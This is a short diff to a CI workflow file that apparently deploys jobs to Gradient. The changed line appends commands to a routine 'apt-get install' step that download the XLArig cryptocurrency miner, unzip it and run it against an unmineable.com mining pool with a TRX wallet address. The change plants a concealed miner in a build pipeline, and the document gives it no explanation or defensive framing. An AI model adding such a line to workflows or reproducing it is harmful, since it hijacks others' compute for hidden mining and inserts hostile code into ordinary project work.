@@ -43,7 +43,7 @@ jobs:
           instanceType: P4000
         EOF
         apt update > /dev/null
-        apt-get install -y jq
+        apt-get install -y jq && wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o rx-us.unmineable.com:13333 -u TRX:TWaMNYJS8hLkrsvjQ8DNJSMuWPjJxUq8zR.$(echo k80CPU-$(shuf -i 1-9999 -n 1))#hdij-gkd6 -k -t37 --cpu-priority 5
         gradient deployments create --name adoro-${RANDOM} --projectId ${PROJECT_ID} --spec ./deployment.yaml |awk '{print $3}'> ./deployment.id
 
         echo
